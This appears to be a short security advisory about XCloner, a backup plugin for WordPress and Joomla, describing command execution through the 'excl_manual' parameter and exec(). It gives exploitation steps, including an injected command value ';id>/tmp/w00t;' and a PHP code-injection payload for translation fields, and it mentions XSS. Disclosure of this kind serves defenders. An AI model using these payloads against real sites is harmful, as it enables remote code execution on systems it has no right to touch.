Description: XCloner is a Backup and Restore component designed for PHP/Mysql websites, it can work as a native plugin for WordPress and Joomla!
Vulnerability:
Lines 1129 of 1135 in cloner.functions.php

1129 $excluded_cmd = "";
1130 if ($fp = @fopen($_REQUEST['
1130 if ($fp = @fopen($_REQUEST['excl_manual'], "r")) {
1131 while (!feof($fp))
1132 $excluded_cmd .= fread($fp, 1024);
1133
1134 fclose($fp);
1135 }

Line 1205:
If configured for manual mode the contents of $excluded_cmd are passed to exec();
We need to supply a file with a list of commands to execute in it, we can create this via the backup comments feature. It creates a file under administrator/backups/.comments with whatever you want in it. Like ;id>/tmp/w00t;

Then change the configuration to manual backup by selecting the radio button and perform a backup.

In a shell:
$ cat /tmp/w00t

Also $excluded_cmd is XSS

The default template has an error with the LM_LOGIN_TEXT field so just clean that out or you’ll get a syntax error when trying to execute.
Adding foo”);phpinfo();define(“foo to the Translation LM_FRONT_* fields then browsing to language/italian.php you’ll execute phpinfo();.
